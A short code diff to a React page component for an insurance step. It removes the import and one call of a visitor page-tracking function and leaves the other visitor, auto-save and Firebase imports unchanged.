@@ -7,7 +7,7 @@ import { Input } from "@/components/ui/input"
 import { Globe } from 'lucide-react'
 import { FullPageLoader } from "@/components/loader"
 import { StepShell } from "@/components/step-shell"
-import { getOrCreateVisitorID, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
+import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking"
 import { useAutoSave } from "@/hooks/use-auto-save"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 import { addData } from "@/lib/firebase"
@@ -63,7 +63,6 @@ export default function InsurancePage() {
         return
       }
       
-      await updateVisitorPage(visitorID, "insur", 2)
       setLoading(false)
     }
     
